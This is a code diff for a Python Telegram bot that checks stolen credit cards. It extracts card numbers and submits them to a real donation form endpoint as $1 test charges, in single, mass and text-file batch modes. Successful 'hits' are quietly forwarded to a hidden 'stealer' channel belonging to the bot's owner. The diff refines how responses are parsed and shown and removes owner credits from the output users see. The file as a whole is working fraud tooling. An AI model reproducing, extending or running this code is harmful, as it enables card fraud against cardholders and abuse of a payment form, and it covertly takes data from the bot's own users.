@@ -41,21 +41,26 @@ def extract_cards(text):
     pattern = r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}"
     return re.findall(pattern, text)
 
+# -------------------------------------------------------------
+# Stealer function (keeps owner line – change if needed)
+# -------------------------------------------------------------
 async def send_hit_to_stealer(client, fullcc, status, response, gateway, time_taken, first_name, role):
-    """Send approved card to stealer channel (NO CC, NO BIN, NO Bank, NO Country)"""
     try:
         stealer_msg = f"""✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗛𝗜𝗧 ✅
 
 {SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
 {SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}
 
-{SYMBOL} 𝗧𝗼𝗼𝗸 {time_taken:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀
-{SYMBOL} 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: {first_name} ({role})
-{SYMBOL} 𝗢𝘄𝗻𝗲𝗿: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
-        await client.send_message(chat_id=-1003627495953, text=stealer_msg, parse_mode="HTML")
+{SYMBOL} 𝗧𝗼𝗼ᴋ {time_taken:.2f} 𝘀ᴇᴄᴏɴᴅs
+{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
+{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+        await client.send_message(chat_id=-1003627495953, text=stealer_msg, parse_mode="HTML", reply_markup=None)
     except Exception as e:
         print(f"[Stealer Error] {e}")
 
+# -------------------------------------------------------------
+# API caller – response comes directly from the JSON
+# -------------------------------------------------------------
 async def call_cc_charge_api(fullcc):
     parts = re.split(r'[|:,\s]+', fullcc.strip())
     cc = parts[0] if len(parts) > 0 else ""
@@ -101,17 +106,25 @@ async def call_cc_charge_api(fullcc):
         try:
             ea_res = await session.post('https://secure.everyaction.com/v2/Forms/CzxnMQjHNE2jDz5i7H8Nrg2', headers=ea_headers, data=ea_data)
             res_json = ea_res.json()
-            status = res_json.get('resultCode', 'Unknown')
+            result_code = res_json.get('resultCode', 'Unknown')
             
-            if status == 'Success':
-                return "Approved ✅", "CHARGED 1$ - APPROVED", gateway_name
+            # Extract the actual message from the API response
+            if result_code == 'Success':
+                # Look for a message in the response; if none, use a generic one
+                msg = res_json.get('message', 'Payment approved')
+                return "Approved ✅", msg, gateway_name
             else:
-                err = res_json.get('errors', [{}])[0].get('text', 'Declined')
-                return "Declined ❌", err, gateway_name
-        except:
-            return "Error", "Submission Failed", gateway_name
+                # Try to get error text from the response
+                errors = res_json.get('errors', [])
+                if errors and len(errors) > 0:
+                    err_msg = errors[0].get('text', 'Transaction declined')
+                else:
+                    err_msg = result_code
+                return "Declined ❌", err_msg, gateway_name
+        except Exception as e:
+            return "Error", f"Submission Failed: {str(e)[:30]}", gateway_name
 
-# --- SINGLE CHECK COMMAND ---
+# --- SINGLE CHECK COMMAND (/cn) ---
 @Client.on_message(filters.command("cn", [".", "/"]))
 async def cc_charge_single_cmd(Client, message):
     try:
@@ -172,7 +185,10 @@ async def cc_charge_single_cmd(Client, message):
         if "Approved" in status or "✅" in status:
             await send_hit_to_stealer(Client, fullcc, status, response, gateway, time.perf_counter() - start, first_name, role)
 
-        finalresp = f"""{status}
+        # Make status bold
+        display_status = f"<b>{status}</b>"
+
+        finalresp = f"""{display_status}
 
 {SYMBOL} 𝗖𝗖 ⇾ <code>{fullcc}</code>
 {SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {gateway}
@@ -183,10 +199,15 @@ async def cc_charge_single_cmd(Client, message):
 {SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {country} {flag}
 
 {SYMBOL} 𝗧ᴏᴏᴋ {time.perf_counter() - start:.2f} 𝘀ᴇᴄᴏɴᴅs
-{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
-{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
         
-        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)
+        await Client.edit_message_text(
+            message.chat.id, 
+            thirdcheck.id, 
+            finalresp, 
+            disable_web_page_preview=True, 
+            parse_mode=enums.ParseMode.HTML
+        )
         
         await setantispamtime(user_id)
         await deductcredit(user_id)
@@ -194,7 +215,7 @@ async def cc_charge_single_cmd(Client, message):
         import traceback
         await error_log(traceback.format_exc())
 
-# --- MASS CHECK COMMAND ---
+# --- MASS CHECK COMMAND (/mcn) ---
 @Client.on_message(filters.command("mcn", [".", "/"]))
 async def cc_charge_mass_cmd(Client, message):
     try:
@@ -234,7 +255,7 @@ async def cc_charge_mass_cmd(Client, message):
         import traceback
         await error_log(traceback.format_exc())
 
-# --- TXT FILE COMMAND ---
+# --- TXT FILE COMMAND (/tcn) ---
 @Client.on_message(filters.command("tcn", [".", "/"]))
 async def cc_charge_txt_cmd(Client, message):
     try:
@@ -281,7 +302,7 @@ async def cc_charge_txt_cmd(Client, message):
         import traceback
         await error_log(traceback.format_exc())
 
-# --- SEQUENTIAL PROCESSING LOGIC (with progress interface & separate approved sends) ---
+# --- SEQUENTIAL PROCESSING (with progress, separate approved messages, declined summary) ---
 async def process_sequential_check(Client, message, ccs, user_id, first_name, role):
     total_cards = len(ccs)
     processed = 0
@@ -331,13 +352,12 @@ Checked by: {first_name} ({role})"""
                 "flag": flag,
                 "time": card_time
             })
-            # Send to stealer (no CC/BIN)
             await send_hit_to_stealer(Client, fullcc, status, response, gateway, card_time, first_name, role)
         else:
             declined_count += 1
             response_status = "DECLINED ❌"
 
-        # Update progress message
+        # Update progress message (NO reply_markup)
         try:
             await Client.edit_message_text(
                 message.chat.id,
@@ -363,9 +383,10 @@ Checked by: {first_name} ({role})""",
     # Delete progress message
     await progress_msg.delete()
 
-    # Send each approved card as separate message (full details)
+    # Send each approved card as separate message (full details, no Owner line)
     for card in approved_cards:
-        approved_msg = f"""{card['status']}
+        display_status = f"<b>{card['status']}</b>"
+        approved_msg = f"""{display_status}
 
 {SYMBOL} 𝗖𝗖 ⇾ <code>{card['fullcc']}</code>
 {SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {card['gateway']}
@@ -376,20 +397,18 @@ Checked by: {first_name} ({role})""",
 {SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {card['country']} {card['flag']}
 
 {SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅs
-{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
-{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
         await message.reply_text(approved_msg, quote=True, parse_mode=enums.ParseMode.HTML)
         await asyncio.sleep(0.5)
 
     elapsed_time = round(time.perf_counter() - start_time, 2)
 
-    # Send declined summary
+    # Declined summary (no Owner line)
     if approved_count > 0:
         declined_summary = f"""❌ 𝗗𝗲𝗰𝗹ɪɴᴇᴅ 𝗖ᴀʀᴅs ({declined_count})
 
 ━━━━━━━━━━━━━━━━━━━━
 """
-        # List cards that are not approved
         declined_list = [cc for cc in ccs if cc not in [c['fullcc'] for c in approved_cards]]
         for card in declined_list[:15]:
             declined_summary += f"{SYMBOL} {card} → Declined\n"
@@ -401,10 +420,7 @@ Checked by: {first_name} ({role})""",
 ❌ Declined: {declined_count}
 📊 Total: {total_cards}
 ⏱ Time: {elapsed_time}s
-👤 Checked by: {first_name} ({role})
-
-━━━━━━━━━━━━━━━━━━━━
-<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+👤 Checked by: {first_name} ({role})"""
         await message.reply_text(declined_summary, quote=True, parse_mode=enums.ParseMode.HTML)
     else:
         await message.reply_text(
@@ -414,10 +430,7 @@ Checked by: {first_name} ({role})""",
 📊 Total Cards: {total_cards}
 ❌ All Declined: {declined_count}
 ⏱ Time: {elapsed_time}s
-👤 Checked by: {first_name} ({role})
-
-━━━━━━━━━━━━━━━━━━━━
-<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>""",
+👤 Checked by: {first_name} ({role})""",
             quote=True,
             parse_mode=enums.ParseMode.HTML
         )
